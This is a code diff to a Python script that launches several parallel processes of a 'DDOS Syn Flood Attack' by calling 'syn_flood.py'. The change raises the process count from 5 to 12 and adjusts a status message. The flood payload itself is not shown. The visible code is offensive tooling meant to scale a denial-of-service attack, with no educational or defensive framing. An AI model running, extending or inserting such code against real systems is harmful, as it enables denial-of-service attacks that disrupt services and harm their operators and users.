@@ -4,7 +4,7 @@ import os
 
 # Function to run a command with Popen and store the process in a list
 def run_ddos_syn_flood(command, process_list):
-    for i in range(5):
+    for i in range(12):
         print("[+] Starting DDOS Syn Flood Attack id: {}".format(i))
         process = subprocess.Popen(command)
         process_list.append(process)
@@ -16,7 +16,7 @@ process_list = []
 command = ['python3', 'syn_flood.py']
 run_ddos_syn_flood(command, process_list)
 
-print("Press CTRL+C to kill the running processes ...")
+print("[INFO] Press CTRL+C to kill the running processes ...")
 
 try:
     while(True):
